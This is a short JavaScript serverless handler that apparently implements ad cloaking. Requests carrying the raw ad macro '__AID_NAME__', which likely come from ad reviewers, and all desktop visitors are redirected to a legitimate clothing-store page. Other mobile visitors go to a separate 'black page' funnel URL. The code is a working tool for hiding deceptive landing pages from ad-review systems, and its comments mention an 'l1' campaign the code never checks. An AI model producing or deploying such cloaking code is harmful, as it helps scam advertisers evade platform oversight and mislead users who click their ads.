export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://diners.com.pk/collections/men-sale?gad_source=1&gclid=CjwKCAiAk8G9BhA0EiwAOQxmfpA1WJFiEkjq0ONutNNpGTmfxgBqiBQge38k4tn5XNp8-1r6eCjvyRoC9wsQAvD_BwE";
    const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1736979042571105-1738006308191131";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
